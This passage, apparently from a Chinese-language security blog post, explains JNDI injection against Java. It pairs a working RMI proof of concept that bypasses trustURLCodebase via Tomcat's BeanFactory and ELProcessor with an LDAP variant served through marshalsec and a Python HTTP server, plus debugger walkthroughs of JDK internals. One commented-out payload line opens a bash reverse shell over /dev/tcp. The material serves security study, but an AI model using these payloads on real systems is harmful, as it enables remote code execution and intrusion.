+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">bypass</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String args<span style="color:#f92672">[])</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            Registry registry <span style="color:#f92672">=</span> LocateRegistry<span style="color:#f92672">.</span><span style="color:#a6e22e">createRegistry</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1099</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            ResourceRef ref <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResourceRef<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.el.ELProcessor&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            ref<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> StringRefAddr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;forceString&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;x=eval&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// ref.add(new StringRefAddr(&#34;x&#34;, &#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;bash&#39;,&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;]).start()\&#34;)&#34;));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ref<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> StringRefAddr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;x&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            ReferenceWrapper referenceWrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReferenceWrapper<span style="color:#f92672">(</span>ref<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            registry<span style="color:#f92672">.</span><span style="color:#a6e22e">bind</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">,</span> referenceWrapper<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">err</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Server ready&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">err</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Server exception: &#34;</span> <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>客户端代码还是和上面一样</p>
+<pre tabindex="0"><code>import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import javax.naming.directory.*;
+import java.util.Hashtable;
+
+public class JNDILookup {
+    public static void main(String[] args) {
+        try {
+            System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
+
+            Object ret = new InitialContext().lookup(&#34;rmi://127.0.0.1:1099/test&#34;);
+            System.out.println(&#34;ret: &#34; + ret);
+        } catch (NamingException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre><h3 id="bypass分析">bypass分析</h3>
+<p>我们来分析poc</p>
+<p>先看<code>ResourceRef</code>，<code>ResourceRef</code> 在 tomcat 中表示某个资源的引用，其构造函数参数如下:</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823152822942.png" alt="image-20230823152822942"></p>
+<p>再来看看poc</p>
+<pre tabindex="0"><code>  ResourceRef ref = new ResourceRef(&#34;javax.el.ELProcessor&#34;, null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);
+            ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;x=eval&#34;));
+            // ref.add(new StringRefAddr(&#34;x&#34;, &#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;bash&#39;,&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;]).start()\&#34;)&#34;));
+            ref.add(new StringRefAddr(&#34;x&#34;, &#34;Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;));
+</code></pre><p>其中我们指定了资源的实际类为 <code>javax.el.ELProcessor</code>，工厂类为 <code>apache.naming.factory.BeanFactory</code>。</p>
+<p>后面为什么这么写，我们下个断点，调试一下</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823154405479.png" alt="image-20230823154405479"></p>
+<p>经过下列调用栈</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823154625504.png" alt="image-20230823154625504"></p>
+<p>进入<code>RegistryContext#decodeObject</code></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823154550746.png" alt="image-20230823154550746"></p>
+<p><code>if</code>就是我们刚刚绕过的地方，然后进入<code>NamingManager.getObjectInstance</code></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823154742519.png" alt="image-20230823154742519"></p>
+<p>经由<code>NamingManager.getObjectInstance</code>进入<code>factory.getObjectInstance</code></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155041193.png" alt="image-20230823155041193"></p>
+<p>进入<code>BeanFactory#getObjectInstance</code>后，首先会判断对象是否是<code>ResourceRef</code>类，接下来通过反射实例化了<code>beanClass</code></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155254776.png" alt="image-20230823155254776"></p>
+<p>取出了键值为<code>forceString</code>的值，以<code>,</code>分割，拆分<code>=</code>键值对，存入<code>hashMap</code>对象中，<code>=</code>右边为调用的方法，<code>=</code>左边则是会通过作为<code>hashmap</code>的<code>key</code>，这里就可以看出<code>poc</code>为什么这样写，继续往下走</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155524191.png" alt="image-20230823155524191"></p>
+<p>此时各个变量值为</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155633170.png" alt="image-20230823155633170"></p>
+<p>最后通过反射执行我们指定的之前构造的方法</p>
+<p>可以看到该方法中有反射的调用<code>method.invoke(bean, valueArray);</code>并且反射所有参数均来自<code>Reference</code>，反射的类来自<code>Object bean = beanClass.newInstance();</code>，这里是<code>ELProcessor</code> ，后面就是分析<code>ELProcessor.eval</code>达到了命令执行。</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155819653.png" alt="image-20230823155819653"></p>
+<p>调用栈如下</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823155943220.png" alt="image-20230823155943220"></p>
+<p>所以整个绕过流程就是：
+为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>
+来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code>
+<code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>
+总结起来就是绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>/<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p>
+<h1 id="jndi_ldap">JNDI_LDAP</h1>
+<p><code>LDAP</code> 服务作为一个树形数据库，可以通过一些特殊的属性来实现 <code>Java</code> 对象的存储，此外，还有一些其他实现 <code>Java</code> 对象存储的方法: * 使用 <code>Java</code> 序列化进行存储； * 使用 <code>JNDI</code> 的引用(Reference)进行存储</p>
+<h2 id="低版本运行">低版本运行</h2>
+<p>我们可以通过<code>LDAP</code>服务来绕过<code>URLCodebase</code>实现远程加载，<code>LDAP</code>服务也能返回<code>JNDI Reference</code>对象，利用过程与<code>jndi</code> + <code>RMI Reference</code>基本一致，不同的是，<code>LDAP</code>服务中<code>lookup</code>方法中指定的远程地址使用的是<code>LDAP</code>协议，由攻击者控制<code>LDAP</code>服务端返回一个恶意<code>jndi Reference</code>对象，并且<code>LDAP</code>服务的<code>Reference</code>远程加载<code>Factory</code>类并不是使用<code>RMI Class Loader</code>机制，因此不受<code>trustURLCodebase</code>限制。</p>
+<h2 id="搭建环境">搭建环境</h2>
+<p><strong>客户端</strong></p>
+<pre tabindex="0"><code>
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.swing.*;
+
+public class ldap {
+
+    public static void main(String[] args) throws Exception {
+        String uri = &#34;ldap://127.0.0.1:1389/EvilClass&#34;;
+        Context ctx = new InitialContext();
+        ctx.lookup(uri);
+    }
+}
+</code></pre><p><strong>服务端</strong>使用工具</p>
+<p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">RandomRobbieBF/marshalsec-jar: marshalsec-0.0.3-SNAPSHOT-all compiled on X64 (github.com)</a></p>
+<pre tabindex="0"><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#EvilClass
+</code></pre><p>在之前编译好的恶意类上起个python服务器</p>
+<pre tabindex="0"><code>python -m http.server 8000
+</code></pre><p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823165835845.png" alt="image-20230823165835845"></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823165844116.png" alt="image-20230823165844116"></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823165858812.png" alt="image-20230823165858812"></p>
+<p>可以成功执行恶意类</p>
+<h2 id="流程分析">流程分析</h2>
+<p><code>JNDI</code>发起<code>ldap</code>的<code>lookup</code>后，将有如下的调用流程，这里我们直接来关注，获得远程<code>LDAP Server</code>的<code>Entry</code>之后，<code>Client</code>这边是怎么做处理的</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823202040636.png" alt="image-20230823202040636"></p>
+<p><code>LADP</code>服务利用流程分析，<code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法</p>
+<p>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">decodeObject</span><span style="color:#f92672">(</span>Attributes var0<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> NamingException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> var2 <span style="color:#f92672">=</span> getCodebases<span style="color:#f92672">(</span>var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">4</span><span style="color:#f92672">]));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            Attribute var1<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>var1 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]))</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                ClassLoader var3 <span style="color:#f92672">=</span> helper<span style="color:#f92672">.</span><span style="color:#a6e22e">getURLClassLoader</span><span style="color:#f92672">(</span>var2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> deserializeObject<span style="color:#f92672">((</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[])((</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[])</span>var1<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">()),</span> var3<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>var1 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">7</span><span style="color:#f92672">]))</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> decodeRmiObject<span style="color:#f92672">((</span>String<span style="color:#f92672">)</span>var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(),</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>var1<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(),</span> var2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                var1 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> var1 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>var1<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span>JAVA_OBJECT_CLASSES<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">])</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>var1<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span>JAVA_OBJECT_CLASSES_LOWER<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">])</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">:</span> decodeReference<span style="color:#f92672">(</span>var0<span style="color:#f92672">,</span> var2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException var5<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            NamingException var4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> NamingException<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            var4<span style="color:#f92672">.</span><span style="color:#a6e22e">setRootCause</span><span style="color:#f92672">(</span>var5<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> var4<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Reference <span style="color:#a6e22e">decodeReference</span><span style="color:#f92672">(</span>Attributes var0<span style="color:#f92672">,</span> String<span style="color:#f92672">[]</span> var1<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> NamingException<span style="color:#f92672">,</span> IOException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String var4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        Attribute var2<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>var2 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]))</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidAttributesException<span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; attribute is required&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            String var3 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>var2<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>var2 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">3</span><span style="color:#f92672">]))</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                var4 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>var2<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//返回一个新的Reference对象引用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            Reference var5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference<span style="color:#f92672">(</span>var3<span style="color:#f92672">,</span> var4<span style="color:#f92672">,</span> var1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> var1<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//获取第6个属性
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>var2 <span style="color:#f92672">=</span> var0<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>JAVA_ATTRIBUTES<span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">]))</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#75715e">//省略部分代码
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//直接返回reference对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span> var5<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>LDAP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p>
+<p><code>reference</code>对象的三个属性:<code>className</code>，<code>classFactory</code>，<code>classFactoryLocation</code>）如下所示：</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823204312724.png" alt="image-20230823204312724"></p>
+<p>接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Object <span style="color:#a6e22e">c_lookup</span><span style="color:#f92672">(</span>Name var1<span style="color:#f92672">,</span> Continuation var2<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> NamingException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    var2<span style="color:#f92672">.</span><span style="color:#a6e22e">setError</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> var1<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    Object var3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Object var4<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        SearchControls var22 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SearchControls<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        var22<span style="color:#f92672">.</span><span style="color:#a6e22e">setSearchScope</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        var22<span style="color:#f92672">.</span><span style="color:#a6e22e">setReturningAttributes</span><span style="color:#f92672">((</span>String<span style="color:#f92672">[])</span><span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        var22<span style="color:#f92672">.</span><span style="color:#a6e22e">setReturningObjFlag</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        LdapResult var23 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">doSearchOnce</span><span style="color:#f92672">(</span>var1<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;(objectClass=*)&#34;</span><span style="color:#f92672">,</span> var22<span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">respCtls</span> <span style="color:#f92672">=</span> var23<span style="color:#f92672">.</span><span style="color:#a6e22e">resControls</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var23<span style="color:#f92672">.</span><span style="color:#a6e22e">status</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">processReturnCode</span><span style="color:#f92672">(</span>var23<span style="color:#f92672">,</span> var1<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var23<span style="color:#f92672">.</span><span style="color:#a6e22e">entries</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> var23<span style="color:#f92672">.</span><span style="color:#a6e22e">entries</span><span style="color:#f92672">.</span><span style="color:#a6e22e">size</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            LdapEntry var25 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>LdapEntry<span style="color:#f92672">)</span>var23<span style="color:#f92672">.</span><span style="color:#a6e22e">entries</span><span style="color:#f92672">.</span><span style="color:#a6e22e">elementAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            var4 <span style="color:#f92672">=</span> var25<span style="color:#f92672">.</span><span style="color:#a6e22e">attributes</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            Vector var8 <span style="color:#f92672">=</span> var25<span style="color:#f92672">.</span><span style="color:#a6e22e">respCtls</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var8 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
